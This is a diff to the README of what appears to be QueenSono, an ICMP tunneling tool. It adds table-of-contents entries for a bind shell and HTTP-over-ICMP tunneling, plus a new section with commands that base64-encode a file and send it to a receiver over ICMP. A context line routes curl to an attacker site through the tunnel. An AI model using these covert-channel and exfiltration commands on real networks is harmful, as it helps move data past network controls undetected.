@@ -3,9 +3,10 @@
 <p align="center"><sup>🧞 "All scripts are there for inspiration and are probably not stable. If you see a good use case and need a more reliable solution, please open an issue"</sup></p>
 
 Some fun things using `QueenSono`
-
-* [Bind Shell](#bind-shell)
-* [HTTP over ICMP tunneling](#http-over-icmp-tunneling)
+- [Bind Shell](#bind-shell)
+  - [One-liner redirect command output](#one-liner-redirect-command-output)
+- [HTTP over ICMP tunneling](#http-over-icmp-tunneling)
+- [Send binary file](#send-binary-file)
 
 ## Bind Shell
 <h5 align="center">In <code>QueenSono/hack/bindshell</code></h5>
@@ -63,6 +64,8 @@ need cap_net_raw cap         need internet access
         └───────────┘    4    └───────────────┘     3     │            │
                                                           └────────────┘
 ```
+1 & 4 are using icmp protocol
+2 & 3 are using http protocol
 
 *> On the attacker machine:* Launch the proxy
 ```
@@ -75,3 +78,21 @@ need cap_net_raw cap         need internet access
 ./qscurl.sh http://myawesomeattackersite.com -H \"toto:titi\"
 ```
 
+## Send binary file
+
+*It is also applicable for all non-human readable files.*
+
+Launch your listener on receiver machine:
+```
+qsreceiver receive -l 0.0.0.0 -f [binary_filename]
+```
+
+On sender machine, encode binary file, send it, remove temporary file:
+```bash
+cat [binary] | base64 > tmpBinary64
+qssender send file -d 1 -l 0.0.0.0 -r [receiver_ip] -s 50000 tmpBinary64 # It is recommanded to use -s 50000 but you could put another value
+rm tmpBinary64
+```
+
+        
+        
